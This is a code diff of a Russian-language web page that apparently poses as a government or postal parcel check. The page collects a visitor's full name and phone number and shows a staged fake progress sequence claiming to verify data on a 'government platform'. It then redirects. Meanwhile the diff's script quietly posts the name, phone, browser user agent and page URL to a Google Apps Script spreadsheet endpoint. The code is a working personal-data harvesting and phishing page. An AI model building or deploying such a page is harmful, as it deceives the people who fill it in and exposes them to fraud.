@@ -210,67 +210,96 @@
     </div>
   </div>
 
-  <script>
-    const yearEl = document.getElementById('year'); yearEl.textContent = new Date().getFullYear();
+    <script>
+    const yearEl = document.getElementById('year');
+    yearEl.textContent = new Date().getFullYear();
+
     function startCheck(){
-  const fio   = document.getElementById('fio').value.trim();
-  const phone = document.getElementById('phone').value.trim();
+      const fio   = document.getElementById('fio').value.trim();
+      const phone = document.getElementById('phone').value.trim();
 
-  const minOk = fio.split(/\s+/).length >= 2 && phone.replace(/\D/g,'').length >= 10;
-  if(!minOk){
-    alert('Пожалуйста, укажите ФИО и корректный номер телефона.');
-    return;
-  }
+      const minOk = fio.split(/\s+/).length >= 2 && phone.replace(/\D/g,'').length >= 10;
+      if(!minOk){
+        alert('Пожалуйста, укажите ФИО и корректный номер телефона.');
+        return;
+      }
 
-  // Логируем в Google Таблицу (не блокирует UI)
-  try { logToSheet(fio, phone); } catch (e) {}
+      // Логируем в Google Таблицу (не блокирует UI)
+      try { logToSheet(fio, phone); } catch (e) { console.warn('logToSheet error:', e); }
 
-  openOverlay();
-  runProgress();
-}
-    function openOverlay(){ document.getElementById('overlay').classList.add('active'); document.body.style.overflow='hidden'; }
-    function closeOverlay(){ document.getElementById('overlay').classList.remove('active'); document.body.style.overflow='auto'; }
+      openOverlay();
+      runProgress();
+    }
+
+    function openOverlay(){
+      document.getElementById('overlay').classList.add('active');
+      document.body.style.overflow='hidden';
+    }
+
+    function closeOverlay(){
+      document.getElementById('overlay').classList.remove('active');
+      document.body.style.overflow='auto';
+    }
+
     function runProgress(){
-      const steps=[{id:'s1',delay:900,text:'Сверяем данные получателя'},{id:'s2',delay:1200,text:'Ищем активные отправления'},{id:'s3',delay:1200,text:'Подтверждаем обращение на гос.площадке'}];
-      const sub=document.getElementById('ov-sub'); const bar=document.getElementById('bar');
+      const steps=[
+        {id:'s1',delay:900,text:'Сверяем данные получателя'},
+        {id:'s2',delay:1200,text:'Ищем активные отправления'},
+        {id:'s3',delay:1200,text:'Подтверждаем обращение на гос.площадке'}
+      ];
+      const sub=document.getElementById('ov-sub');
+      const bar=document.getElementById('bar');
+
       let total=0; steps.forEach(s=> total+=s.delay);
-      let acc=0; steps.forEach((s,idx)=>{
+      let acc=0;
+      steps.forEach((s,idx)=>{
         setTimeout(()=>{
-          if(idx>0){const prev=document.getElementById(steps[idx-1].id); prev.classList.remove('active'); prev.classList.add('done');}
-          const cur=document.getElementById(s.id); cur.classList.add('active'); sub.textContent=s.text+'…';
+          if(idx>0){
+            const prev=document.getElementById(steps[idx-1].id);
+            prev.classList.remove('active'); prev.classList.add('done');
+          }
+          const cur=document.getElementById(s.id);
+          cur.classList.add('active');
+          sub.textContent=s.text+'…';
           bar.style.width=Math.round(((idx+1)/steps.length)*90)+'%';
         }, acc+=s.delay);
       });
+
       setTimeout(()=>{
-        document.getElementById(steps[steps.length-1].id).classList.remove('active'); document.getElementById(steps[steps.length-1].id).classList.add('done');
+        const lastId=steps[steps.length-1].id;
+        document.getElementById(lastId).classList.remove('active');
+        document.getElementById(lastId).classList.add('done');
         sub.textContent='Готово'; bar.style.width='100%';
         document.getElementById('gov-note').style.display='block';
         setTimeout(()=>{ goGov(); }, 900);
       }, total+400);
     }
+
     function goGov(){ window.location.href='alert.html'; }
-    <script>
-// === Отправка в Google Sheets (замени URL и ключ) ===
-const GS_URL = 'https://script.google.com/macros/s/AKfycbzQZ6EvmFCy3H3_i4M968_mmNel7dg4LdKZtu_pGTVRABTuOcktP1e7zizl81eS2iZwUQ/exec';
-const GS_KEY = 'YOUR_SECRET_KEY'; // тот же, что в Apps Script
+  </script>
 
-function logToSheet(fio, phone){
-  const payload = new URLSearchParams({
-    key: GS_KEY,
-    fio,
-    phone,
-    ua: navigator.userAgent,
-    ref: location.href
-  }).toString();
+  <!-- Отправка в Google Sheets — отдельный блок -->
+  <script>
+    // ЗАМЕНИ на свои значения:
+    const GS_URL = 'https://script.google.com/macros/s/AKfycbzQZ6EvmFCy3H3_i4M968_mmNel7dg4LdKZtu_pGTVRABTuOcktP1e7zizl81eS2iZwUQ/exec';
+    const GS_KEY = 'YOUR_SECRET_KEY'; // тот же ключ должен быть в Apps Script (const SECRET_KEY = 'YOUR_SECRET_KEY')
 
-  // простой и надёжный вариант для GitHub Pages + Apps Script
-  fetch(GS_URL, {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: payload
-  });
-}
-</script>
+    function logToSheet(fio, phone){
+      const payload = new URLSearchParams({
+        key: GS_KEY,
+        fio,
+        phone,
+        ua: navigator.userAgent,
+        ref: location.href
+      }).toString();
+
+      fetch(GS_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: payload
+      });
+    }
+  </script>
 </body>
 </html>
